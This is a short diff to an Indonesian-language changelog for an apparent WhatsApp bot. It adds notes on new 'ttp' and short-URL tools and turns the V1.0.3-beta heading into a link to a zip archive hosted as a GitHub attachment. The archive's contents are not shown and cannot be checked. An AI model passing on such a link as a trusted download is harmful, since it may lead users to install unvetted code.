@@ -3,12 +3,14 @@
 Semua perubahan yang dilakukan pada proyek ini akan dicatat dalam file ini.
 
 ==============
-## V1.0.3-beta
+## [V1.0.3-beta](https://github.com/user-attachments/files/17806920/whatsapp-bot.zip) 
 - Menambahkan Fitur Download
   • Aptoide
 
 - Merubah Tampilan menu
 - Support Channel
+- menambahkan fitur tools
+  • ttp & shorturl 
 
 ==============
 ## V1.0.2-beta
